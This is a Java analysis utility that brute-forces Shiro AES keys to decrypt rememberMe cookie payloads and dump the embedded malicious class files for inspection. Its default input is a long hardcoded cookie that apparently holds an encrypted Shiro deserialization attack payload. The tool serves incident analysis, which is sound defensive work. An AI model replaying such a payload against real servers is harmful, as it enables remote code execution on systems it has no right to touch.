package priv.ga0weI.demoshrio;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.codec.CodecSupport;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.util.ByteSource;
import org.apache.shiro.util.SimpleByteSource;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * @author ga0weI
 * @Time 2022/3/25
 * @readme decode shiro payload
 */
public class Decodeforpayload {
    private static final char[] HEX_CHAR_TABLE = {
            '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
    };
    private static final Map<Character, Byte> MAP = new HashMap<>();

    static {
        for (int i = 0; i < HEX_CHAR_TABLE.length; i++) {
            char c = HEX_CHAR_TABLE[i];
            MAP.put(c, (byte) i);
        }
    }
    public static void main(String[] args) throws  Exception{
        AesCipherService aes = new AesCipherService();
        Scanner scanner = new Scanner(new FileInputStream("keys.txt"));
        String cookies;
        if (args.length==1&&args[0]!=null) {
            cookies = args[0];
            System.out.println(args[0]);
        }
        else {
            //没有输入就默认
            cookies = " rememberMe=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";
        }
        while (scanner.hasNext()){
            String keysting = scanner.nextLine();
            byte[] key = Base64.decode(CodecSupport.toBytes(keysting));
            //get payload and init to ByteSource
            cookies = cookies.trim().replace(" ","");
            //payload clean
            if (cookies.startsWith("Cookie:rememberMe="))
                cookies =  cookies.substring(18,cookies.length());
            if (cookies.startsWith("rememberMe="))
                cookies = cookies.substring(11,cookies.length());

            ByteSource ciphertext  = new SimpleByteSource(Base64.decode(cookies));
            //mathcer evalclass   error
            String pattern = "cafebabe.*?100009";
            Pattern r = Pattern.compile(pattern);
            try {
                ByteSource mingwen = aes.decrypt(ciphertext.getBytes(), key);
                System.out.println("使用默认密钥：————"+keysting+"————解密成功");
                System.out.println("解密之后：\n"+Base64.decodeToString(mingwen.toString()));
                String hexx = bytesToHex(Base64.decode(mingwen.toString()));
//                System.out.println("16进制：\n"+hexx);
                Matcher m = r.matcher(hexx);
                int i =0;
                while (m.find()){
//                    System.out.println(m.group());
                    writertofile(m.group(),i);
                    i=i+1;
                }
                System.out.println("还原出来"+i+"个恶意类");
            }catch (Exception e){
                System.out.println("密钥————"+keysting+"—————解密失败！！！");
            }
        }
    }
    /**
     * 16进制字符串生成恶意类文件
     * @param group
     * @param i
     * @throws Exception
     */
    private static void writertofile(String group, int i) throws Exception {
        //cafebabe开头  100009结尾中间拿恶意类
        byte [] classss = toByteArray(group);
        System.out.println(new String(classss));
        FileOutputStream fos = new FileOutputStream("EVAL"+i+".class");
        fos.write(classss);
        fos.flush();
        fos.close();
    }
    /**
     * 字节数组转16进制
     * @param bytes 需要转换的byte数组
     * @return  转换后的Hex字符串
     */
    public static String bytesToHex(byte[] bytes) {
        StringBuffer sb = new StringBuffer();
        for(int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xFF);
            if(hex.length() < 2){
                sb.append(0);
            }
            sb.append(hex);
        }
        return sb.toString();
    }
    /**
     * 16进制字符串转byte数组
     * @param hexString
     * @return
     */
    public static byte[] toByteArray(String hexString) {
        byte[] result = new byte[hexString.length() / 2];
        for (int i = 0; i < hexString.length() / 2; i++) {
            char hi = hexString.charAt(i * 2);
            char lo = hexString.charAt(i * 2 + 1);
            result[i] = (byte) ((MAP.get(hi) << 4) + MAP.get(lo));
        }
        return result;
    }

}